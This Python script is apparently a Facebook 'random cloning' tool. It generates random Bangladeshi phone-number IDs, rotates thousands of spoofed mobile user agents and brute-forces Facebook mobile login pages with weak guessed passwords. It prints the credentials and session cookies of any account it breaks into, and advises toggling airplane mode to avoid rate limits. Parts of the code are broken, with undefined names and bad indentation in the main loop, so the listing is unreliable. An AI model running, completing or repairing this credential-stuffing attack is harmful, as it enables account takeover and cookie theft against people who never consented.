import time,os,json,sys,re,string, random 
from concurrent.futures import ThreadPoolExecutor as ThreadPool


try:
    import rich
except:
    print("\n[!?] Installing Rich...\n")
    os.system("pip install rich")
    import rich

try:
    import requests
except:
    print("\n[!?] Installing Requests...\n")
    os.system("pip install requests")
    import requests

try:
    import httpx
except:
    print("\n[!?] Installing Httpx...\n")
    os.system("pip install httpx")
    import httpx

try:
    import bs4
except:
    print("\n[!?] Installing Bs4...\n")
    os.system("pip install bs4")
    import bs4



from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
pretty.install()

from datetime import datetime 
ct=str(datetime.now())
ct2=ct.split(" ")[0]
ct3=ct2.split("-")[1]
mon={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December"}
month=mon[ct3]
datea=ct2.split("-")[2]


def lod(message):
    
    for i in track(range(300), description=f"[red][bold] {message}"):
        time.sleep(0.01)



def clear():
    shell("clear")

def logo():
    clear()
    print("""
   _ __ ___  ___   _   _  __
  /// // _/ / o |,' \ / |/ /
 / ` // _/ /  ,'/ o |/ || / 
/_n_//___//_/`_\|_,'/_/|_/       0.1
    """)
    
def space():
    print("\n")


number=int("+8801944981090")

devoloper_info={
    "Developer" :  'HERON AFRIDI',
    "Number" :  number,
    "Status" :  '24-ONLINE',
    "GitHub Url":  'https://github.com/TEAM-ELITE1',
    "Facebook" :  'facebook.com/Freestyle.0fficial',
    }

date={
    "Day":datea,
    "Month":month,
 }
mj=Tree("[bold purple]![[bold red]A[bold purple]] ")
mj.add("[cyan][bold]RANDOM CLONEING ").add("[bold green][GOOD]")

mx=Tree("[bold purple]![[bold red]B[bold purple]] ")
mx.add("[bold yellow]FILE CLONEING").add("[bold green][GREAT]")

my=Tree("[bold purple]![[bold red]C[bold purple]] ")
my.add("[tan][bold]REPORT BUG ")

cv=Tree("[bold blue][>+<]")
cv.add("[bold red]Choice Option")



ugen=[]
for ua in range(12000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	y=random.choice(['RMX3572','RMX3395','RMX3396','RMX2117','RMX3161','RMX3121','RMX3125','RMX3041','RMX2200','RMX2111','RMX2111','RMX3560'])
	c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,168)
	h='Mobile Safari/537.36'
	rocky=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(rocky)
	
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=random.choice(['SM-M546B','SM-N981B','SSM-N981N','SM-N981W','SM-N985F','SM-N900','SM-N9002','LM-Q710(FGN)'])
	d=') Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(92,115)
	x='0'
	f=random.randrange(4200,6000)
	g=random.randrange(62,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}; {c}{d}{e}.{x}.{f}.{g} {h}'
	ugen.append(lol)

ua = [
"Mozilla/5.0 (Linux; Android 12; RMX2111 Build/SP1A.210812.016; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.69 Mobile Safari/537.36 BingSapphire/24.1.410218302",
"Mozilla/5.0 (Linux; Android 11; RMX2121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 GSA/13.7.7.23.arm64",
"Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1",
]


note1="""- __Inbox__ Me for Join `Team Elite`\n- Try tool and **Review**"""
n1=Markdown(note1)

note2="""#  __RANDOM CLONEING TASK BOX__\n- Choice BD code \n- And Put Limit"""
n2=Markdown(note2)

note3="""- __System__ Starting Bro Wait\n- Follow our **FB Group**\n- Inbox Me For Anything"""
n3=Markdown(note3)

note4="""- Use Airplane mode in every 3 minutes \n- Use APN For Get More Ok ID \n- Cracking Started """
n4=Markdown(note4)

nv = Padding("TOOL MENU", style="on green", expand=False)
cxx = Padding("DONE",(1,2), style="on green", expand=False)



import os
try:
    open(".itu.txt","r").read()
except:
    os.system("pkg install play-audio")
    open(".itu.txt","w").write("__&")
try:
    import gtts
except:
    os.system("pip install gtts")
    import gtts
from gtts import gTTS

def create_(text,file):
    my_a = gTTS(text)
    my_a.save(file)


def play_audio(audio_file):
    os.system("play-audio "+audio_file)

def dual(text,file):
    create_(text,file)
    play_audio(file)
    

ok=[]
ok.append("199")
loop=0
def main():
    logo()
    space()
    print(n3)
    space()
    lod("STARTING TOOL...")
    logo()
    print_json(data=devoloper_info)
    print(Panel(n1,title="[bold red]NOTE"))
    space()
    #dual("Hello bro,I am Zara,I am an artificial intelligent,and welcome to our tool","y.mp3")
    
    print(nv)
    space()
    print(mj)
    print(mx)
    print(my)
    space()
    print(cv)
    choice=input("    └──>")
    if choice in ["a","A","1","01"]:
        numb()
    else:
        numb()

def numb():
    user=[]
    logo()
    
    print(n2)
    space()
    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example 017, 019, 016, ")
    code=input("                        ✓ Choice ->")
    print("                      [bold yellow]  ✓ [bold green]You Choosed "+code)
    space()
    space()
    print("    [bold red]LIMIT              [bold yellow] ✓ [bold green]Example 1000,2000,3000") 
    limit=int(input("                        ✓ Choice ->"))
    print("                      [yellow] [bold] ✓[bold green] Crack Limit ",limit)
    print(cxx)
    space()
    for i in track(range(limit),description="      Dumping"):
        numx=''.join(random.choice(string.digits) for _ in range(8))
        user.append(numx)
    #dual("Dumping successful","y.mp3")
    
    with ThreadPool (max_workers=90) as feel:
        logo()
        print(Markdown("# CHOOSE MATHOD"))
        space()
        Mathi1=Tree("[bold white][A/1]")
        Mathi1.add("M. FACEBOOK ")
        print(Mathi1)
        space()
        Mathi2=Tree("[bold green][B/2]")
        Mathi2.add("MBASIC. FACEBOOK ")
        print(Mathi2)
        space()
        Mathi3=Tree("[bold blue][C/3]")
        Mathi3.add("P. FACEBOOK ")
        print(Mathi3)
        space()
        Mathi4=Tree("[bold yellow][D/4]")
        Mathi4.add("X. FACEBOOK ")
        print(Mathi4)
        space() 
        Mathi5=Tree("[bold red][E/5]")
        Mathi5.add("FREE. FACEBOOK ")
        print(Mathi5)
        space()
        Mathi6=Tree("[bold cyan][F/6]")
        Mathi6.add("TOUCH. FACEBOOK ")
        print(Mathi6)
        space()
        jbs=input("                [✓] choice:")
        if jbs in ["1","A","a","01"]:
            tsg="m"
        elif jbs in ["2","B","b","02"]:
            tsg="mbasic"
        elif jbs in ["3","C","c","03"]:
            tsg="p"
        elif jbs in ["4","D","d","04"]:
            tsg="x"
        elif jbs in ["5","E","e","05"]:
            tsg="free"
        elif jbs in ["6","F","f","06"]:
            tsg="touch"
        else:
            tsg="m"
        logo()
        tl=str(len(user))
        tl_=Tree("[green]Total ID ")
        tl_.add("[bold green]"+tl)
        mathod=Tree("[blue]Mathod")
        mathod.add("[bold blue]"+tsg)
        
        space()
        print(n4)
        space()
        print_json(data=date)
        space()
        print(tl_)
        space()
        print(mathod)
        print(Markdown("# Crack Started"))
        space()
        for i in user:
            uid=code+i
            fb=tsg
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Asraf']
            uid = code+love
           draco_crack.submit(Asrafm,uid,pwx,tl)



def need(uid,pwx,fb,tl):
    global ok,ugen,loop
    session=requests.session()
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            uuu=random.choice(ugen)
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                hh=str(len(ok))
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15]
                print("\r\r\n\n")
                print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
                #print(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n")
                
                ok.append(uid)
                break
            
            else:
                continue
        loop+=1
    except:
        time.sleep(15)

main()